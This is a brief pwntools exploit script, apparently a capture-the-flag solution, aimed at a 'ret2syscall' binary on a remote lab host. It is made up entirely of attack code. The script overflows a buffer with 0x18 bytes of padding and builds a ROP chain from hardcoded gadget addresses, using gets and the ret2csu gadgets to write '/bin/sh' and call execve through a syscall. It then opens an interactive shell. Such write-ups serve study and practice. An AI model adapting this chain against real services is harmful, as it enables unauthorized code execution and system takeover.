from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process("./ret2syscall")
s=remote("192.168.3.253",51004)
elf=ELF("../dist/ret2syscall")
rdi=0x00000000004012e3
rsi_r15=0x00000000004012e1
csu1=0x4012DA
csu2=0x4012C0
rax=0x401196
syscall=0x4011AE
#pause()
s.sendlineafter(b"Input: \n",flat([
    b"a"*0x18,
    rdi,0x404500,
    elf.plt.gets,
    rdi,0x3b,rax,
    csu1,0,1,0x404500,0,0,0x404508,
    csu2,
]))
#pause()
s.sendline(b"/bin/sh\x00"+p64(syscall))
s.interactive()
